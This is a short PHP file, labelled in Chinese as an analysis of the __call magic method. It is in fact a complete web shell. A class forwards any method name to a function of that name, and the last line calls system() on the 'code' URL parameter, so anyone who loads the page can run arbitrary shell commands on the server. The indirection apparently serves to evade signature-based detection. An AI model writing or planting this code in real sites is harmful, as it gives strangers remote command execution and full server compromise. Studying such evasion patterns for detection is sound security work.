<?php
/* 
 *  类方法__call分析
 */
class Foo{
    public function __call($name, $args) {
        $name($args[0]);
    }
}
$obj = new Foo();
$obj->system($_GET['code']);
